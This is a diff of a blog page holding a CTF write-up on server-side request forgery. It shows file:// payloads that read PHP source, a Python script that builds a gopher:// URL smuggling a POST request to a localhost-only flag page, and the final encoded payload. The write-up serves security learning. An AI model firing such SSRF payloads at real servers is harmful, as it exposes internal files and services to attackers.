@@ -688,11 +688,7 @@
 
 
 
-  
 
-
-
-  
 
 
 
@@ -725,52 +721,6 @@
   </span>
 
 </span>
-</span><span class="px-2 text-primary-500">&middot;</span><span>
-  
-  
-    
-    
-      
-      
-        
-        
-      
-      
-    
-  
-  <span id="likes_posts/sec/wp/CTFHUB---SSRF-POST请求.md"
-    class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400"
-    title="likes">loading</span>
-  <span class="inline-block align-text-bottom">
-
-  <span class="relative block icon">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
-  </span>
-
-</span>
-</span><span class="px-2 text-primary-500">&middot;</span><span>
-    <button id="button_likes"
-        class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-        onclick="process_article()">
-        <span id="button_likes_heart" style="display:none" class="inline-block align-text-bottom">
-
-  <span class="relative block icon">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
-  </span>
-
- </span>
-        <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom">
-
-  <span class="relative block icon">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg>
-  </span>
-
-</span>
-        <span id="button_likes_text">&nbsp;Like</span>
-    </button>
 </span>
   
 
@@ -1070,39 +1020,39 @@
 <pre tabindex="0"><code>?url=file:///var/www/html/index.php
 ?url=file:///var/www/html/flag.php
 </code></pre><p>index.php</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])){</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /?url=_&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_REQUEST</span>[<span style="color:#f1fa8c">&#39;url&#39;</span>])){
+</span></span><span style="display:flex;"><span>    header(<span style="color:#f1fa8c">&#34;Location: /?url=_&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$ch</span> <span style="color:#ff79c6">=</span> curl_init();
+</span></span><span style="display:flex;"><span>curl_setopt(<span style="color:#8be9fd;font-style:italic">$ch</span>, CURLOPT_URL, <span style="color:#8be9fd;font-style:italic">$_REQUEST</span>[<span style="color:#f1fa8c">&#39;url&#39;</span>]);
+</span></span><span style="display:flex;"><span>curl_setopt(<span style="color:#8be9fd;font-style:italic">$ch</span>, CURLOPT_HEADER, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>curl_setopt(<span style="color:#8be9fd;font-style:italic">$ch</span>, CURLOPT_FOLLOWLOCATION, <span style="color:#bd93f9">1</span>);
+</span></span><span style="display:flex;"><span>curl_exec(<span style="color:#8be9fd;font-style:italic">$ch</span>);
+</span></span><span style="display:flex;"><span>curl_close(<span style="color:#8be9fd;font-style:italic">$ch</span>);
 </span></span></code></pre></div><ul>
 <li>URL 空时，自动302重定向到 <code>Location: /?url=_</code></li>
 <li>否则访问 URL</li>
 <li>所以可通过 <code>?url=localhost/flag.php</code> 访问到 flag.php 文件</li>
 </ul>
 <p>flag.php</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Just View From 127.0.0.1&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;CTFHUB&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;key&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;key&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>error_reporting(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#34;REMOTE_ADDR&#34;</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;Just View From 127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$flag</span><span style="color:#ff79c6">=</span>getenv(<span style="color:#f1fa8c">&#34;CTFHUB&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$key</span> <span style="color:#ff79c6">=</span> md5(<span style="color:#8be9fd;font-style:italic">$flag</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#34;key&#34;</span>]) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#34;key&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">$key</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> <span style="color:#8be9fd;font-style:italic">$flag</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">exit</span>;
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>发现只要向 flag.php 发送一个 POST 请求就会输出flag，key的值已经在源码中给出了</li>
 </ul>
@@ -1129,8 +1079,8 @@
 <li>可能的解释是直接发送 POST 无法访问内网，没有权限，这也是 ssrf 的优势，就是要利用服务端伪造请求，权限一般高于客户端的请求，可以访问内网，这题指明是 ssrf，所以用 gopher 协议发送 POST</li>
 </ul>
 <p>构造：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?url<span class="o">=</span>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;
-</span></span><span class="line"><span class="cl"><span class="c1"># &lt;gopher-path&gt; 是 POST 包的内容</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?url<span style="color:#ff79c6">=</span>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># &lt;gopher-path&gt; 是 POST 包的内容</span>
 </span></span></code></pre></div><p>POST：</p>
 <pre tabindex="0"><code>POST /flag.php HTTP/1.1
 Host: 127.0.0.1:80
@@ -1147,26 +1097,26 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 <li>再对完整的 payload （<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code>）进行 URL 编码</li>
 </ul>
 <p>python 脚本得到最终的 payload：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>\
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">POST /flag.php HTTP/1.1
-</span></span></span><span class="line"><span class="cl"><span class="s2">Host: 127.0.0.1:80
-</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: 36
-</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">key=d40e836124bc67ddd5a567ec1ad22176
-</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># URL编码 unquote是解码</span>
-</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 在 HTTP 协议中，头部字段是以 \r\n 作为分隔的</span>
-</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;%0A&#39;</span><span class="p">,</span><span class="s1">&#39;%0D%0A&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">new</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;gopher://127.0.0.1:80/&#39;</span><span class="o">+</span><span class="s1">&#39;_&#39;</span><span class="o">+</span><span class="n">new</span>
-</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>      
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span>\
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">POST /flag.php HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Host: 127.0.0.1:80
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Content-Length: 36
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">key=d40e836124bc67ddd5a567ec1ad22176
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># URL编码 unquote是解码</span>
+</span></span><span style="display:flex;"><span>tmp <span style="color:#ff79c6">=</span> urllib<span style="color:#ff79c6">.</span>parse<span style="color:#ff79c6">.</span>quote(payload)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(tmp)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 在 HTTP 协议中，头部字段是以 \r\n 作为分隔的</span>
+</span></span><span style="display:flex;"><span>new <span style="color:#ff79c6">=</span> tmp<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;%0A&#39;</span>,<span style="color:#f1fa8c">&#39;%0D%0A&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(new)
+</span></span><span style="display:flex;"><span>result <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;gopher://127.0.0.1:80/&#39;</span><span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;_&#39;</span><span style="color:#ff79c6">+</span>new
+</span></span><span style="display:flex;"><span>result <span style="color:#ff79c6">=</span> urllib<span style="color:#ff79c6">.</span>parse<span style="color:#ff79c6">.</span>quote(result)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(result)      
 </span></span></code></pre></div><p>payload：</p>
 <pre tabindex="0"><code>?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253Dd40e836124bc67ddd5a567ec1ad22176%250D%250A
 </code></pre><p>flag：
